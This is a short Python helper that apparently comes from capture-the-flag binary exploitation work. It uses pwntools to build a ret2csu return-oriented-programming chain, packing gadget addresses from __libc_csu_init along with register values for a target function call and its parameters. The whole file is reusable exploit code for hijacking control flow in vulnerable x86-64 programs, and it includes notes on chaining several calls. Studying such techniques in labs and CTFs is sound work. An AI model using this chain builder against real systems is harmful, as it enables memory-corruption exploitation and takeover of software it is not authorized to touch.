# -*- coding:utf-8 -*-
from pwn import p64


def ret2csu(func, param1=0, param2=0, param3=0, ret=1, init=0x4018D0, offset=0x38):
    """
    # pop rbx, rbp, r12, r13, r14, r15
    # rbx should be 0,
    # rbp should be 1,enable not to jump
    # r12 should be the function we want to call
    # rdi = edi = r15d
    # rsi = r14
    # rdx = r13
    """

    """ 连续调用 ret2csu: 
    p64(start1) + \
    p64(0) + p64(1) + p64(func) + p64(param3) + p64(param2) + p64(param1) + p64(start2) + "a" * 8 + \
    p64(0) + p64(1) + p64(func) + p64(param3) + p64(param2) + p64(param1) + p64(start2) + "a" * 8 + \
    ...
    
    or paylaod += ret2csu(...)[8:]
    """
    start1 = init + 0x5A
    start2 = init + 0x40

    if ret:
        return (p64(start1) + p64(0) + p64(1) + p64(func) + p64(param3) + p64(param2) + p64(param1) + p64(start2) + "a" * offset)
    else:
        return (p64(start1) + p64(0) + p64(1) + p64(func) + p64(param3) + p64(param2) + p64(param1) + p64(start2))
